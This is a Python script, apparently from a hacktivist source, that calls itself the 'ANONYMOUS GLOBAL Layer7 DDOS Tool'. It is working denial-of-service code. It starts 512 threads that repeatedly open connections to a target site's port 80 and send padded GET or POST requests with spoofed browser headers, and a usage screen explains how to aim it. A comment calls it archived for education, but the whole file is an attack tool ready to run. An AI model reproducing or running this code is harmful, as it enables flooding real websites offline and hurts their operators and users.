#!/usr/bin/python

# Layer 7 DDoS Tool
# NOTE: This script is archived for educational purposes only.
# Refactored with ChatGPT because i'm too lazy to do it myself

import sys
import socket
import time
import getopt
import re
from threading import Thread

class MyThread(Thread):
    def __init__(self, site, dos_type):
        super().__init__()
        self.method = dos_type.upper()
        self.site = site
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            try:

                server = socket.gethostbyname(self.site)


                post = 'x' * 9999
                file = '/'

                request = (
                    f"{self.method} /{file} HTTP/1.1\r\n"
                    f"Host: {self.site}\r\n"
                    "User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    "Accept-Language: en-us,en;q=0.5\r\n"
                    "Accept-Encoding: gzip,deflate\r\n"
                    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                    "Keep-Alive: 9000\r\n"
                    "Connection: close\r\n"
                    "Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(post)}\r\n\r\n"
                )

                new_request = f"{post}\r\n\r\n"

                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((server, 80))
                    s.send(request.encode())
                    s.send(new_request.encode())

                time.sleep(60)  

            except Exception as e:
                print(f"Error: {e} | Target Down?")


def da_delegator(site, dos_type):
    thread_count = 512
    print('=' * 60)
    print('ANONYMOUS GLOBAL #Layer7 Tool v.1'.center(60, '-'))
    print('=' * 60)

    threads = []


    for _ in range(thread_count):
        thread = MyThread(site, dos_type)
        thread.start()
        threads.append(thread)


    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Ctrl-C received! Terminating threads...")
        for thread in threads:
            thread.kill_received = True
        sys.exit(2)


def main(argv):
    def usage():
        print('=' * 60)
        print('ANONYMOUS GLOBAL #Layer7 DDOS Tool v.1'.center(60, '-'))
        print('=' * 60)
        print('Usage:')
        print('  For GET DOS: Layer7.py -t get http://example.com')
        print('  For POST DOS: Layer7.py -t post http://example.com')
        sys.exit(2)

    if not argv:
        usage()

    try:
        opts, args = getopt.getopt(argv, "t:h", ["type", "help"])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(2)

    if not args:
        usage()

    site = re.sub(r'http://', '', args[-1])  

    for opt, arg in opts:
        if opt in ("-t", "--type"):
            dos_type = arg.lower()
            if dos_type in ("get", "post"):
                da_delegator(site, dos_type)
            else:
                print("Invalid type. Use 'get' or 'post'.")
                usage()
        elif opt in ("-h", "--help"):
            usage()
        else:
            print("Unhandled option.")
            usage()

if __name__ == "__main__":
    main(sys.argv[1:])
